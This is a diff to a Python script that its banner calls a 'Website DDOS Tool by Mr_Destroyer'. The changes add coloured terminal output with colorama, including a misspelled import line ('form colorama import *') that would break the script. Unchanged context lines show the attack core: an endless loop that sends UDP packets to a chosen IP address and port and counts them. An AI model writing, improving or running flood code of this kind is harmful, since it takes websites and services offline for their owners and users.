@@ -9,28 +9,33 @@ import socket
 import os
 import random
 import time 
+import colorama 
+colorama.init()
+form colorama import *
+
+
 #Banner
-print("________________________________________________________________")
+print(Fore.GREEN + "________________________________________________________________")
 print("")
 print()
-print("               Mr_Destroyer is here                              |")                            
+print(Fore.CYAN + "               Mr_Destroyer is here                              |")                            
 print()
-print("               Website DDOS Tool by Mr_Destroyer                 |")               
+print(Fore.CYAN + "               Website DDOS Tool by Mr_Destroyer                 |")               
 print()
 print()
-print("_________________________________________________________________")
+print(Fore.GREEN + "_________________________________________________________________")
 print()
-print("Choose Your operating system")
+print(Fore.GREEN + "Choose Your operating system")
 print()
-print("__________________________________________________________________")
+print(Fore.GREEN + "__________________________________________________________________")
 print()
-print("[1] Windows ")
+print(Fore.CYAN + "[1] Windows ")
 print()
-print("[2] Linux ")
+print(Fore.CYAN + "[2] Linux ")
 print()
-print("[3] Termux ")
+print(Fore.CYAN + "[3] Termux ")
 print()
-name = input("choose: ")
+name = input(Fore.GREEN + "choose: ")
 
 if(name=="1"):
     os.system("cls")
@@ -65,4 +70,4 @@ sent = 0
 while True:
     sock.sendto(bytes , (ip , port))
     sent = sent+1
-    print("Sending %s packet to %s throught port %s " %(sent,ip,port))
+    print(Fore.RED + "Sending %s packet to %s throught port %s " %(sent,ip,port))
